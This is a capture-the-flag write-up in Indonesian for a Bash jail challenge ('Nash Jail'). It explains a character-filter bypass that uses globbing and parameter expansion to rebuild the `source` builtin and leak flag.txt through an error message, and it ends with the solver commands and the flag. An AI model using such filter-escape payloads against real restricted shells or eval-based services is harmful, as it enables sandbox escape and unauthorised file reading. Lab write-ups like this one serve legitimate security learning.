# Nash Jail

Filter-nya kelihatan galak, tapi `eval "$input"` masih jadi titik masuk utama. Huruf, angka, `/`, `.`, `*`, `!`, `%`, tanda kutip, `<`, `>`, `@`, dan `&` diblok. Yang masih boleh dipakai cukup buat main di ekspansi Bash.

Bug yang paling penting ada di awal script:

```bash
export PATH=""
unset $(env | cut -d= -f1)
```

`PATH` dikosongkan duluan, jadi `env` dan `cut` gagal jalan. Environment tidak benar-benar dibersihkan.

## Inti exploit

Payload final:

```bash
: ???????;__=$_;__=${__#????};__=${__:$#:${##}};${__} ????????
```

Urutannya:

1. `: ???????`
   Menjalankan builtin `:` dengan glob 7 karakter. Argumen terakhir yang masuk ke shell jadi `jail.sh`, lalu bisa diambil lewat `$_`.

2. `__=$_`
   Simpan `jail.sh` ke variabel `__`.

3. `__=${__#????}`
   Buang `jail`, hasilnya `.sh`.

4. `__=${__:$#:${##}}`
   `$#` bernilai `0`, `${##}` bernilai `1`. Jadi ini mengambil 1 karakter mulai offset 0 dari `.sh`, hasilnya `.`.

5. `${__} ????????`
   `${__}` sekarang adalah builtin `.` (`source`), dan `????????` di direktori kerja match ke `flag.txt`.

Karena glob di-expand urut alfabet, `????????` memilih `flag.txt` sebelum `jail.sh` dan `start.sh`. File flag lalu di-`source`, sehingga isi baris flag muncul di error:

```text
flag.txt: line 1: TBCTF{r357r1c73d_bu7_n07_1mp0551bl3}: No such file or directory
```

Itu cukup buat ambil flag.

## Reproduksi

Jalankan solver:

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py
```

Output penting:

```text
flag.txt: line 1: TBCTF{r357r1c73d_bu7_n07_1mp0551bl3}: No such file or directory
TBCTF{r357r1c73d_bu7_n07_1mp0551bl3}
```

## Flag

```text
TBCTF{r357r1c73d_bu7_n07_1mp0551bl3}
```
